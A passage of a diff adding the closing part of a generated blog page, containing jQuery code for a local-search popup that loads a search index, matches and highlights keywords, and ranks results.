+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url).replace(/\/{2,}/g, '/');
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x"></i></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x"></i></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
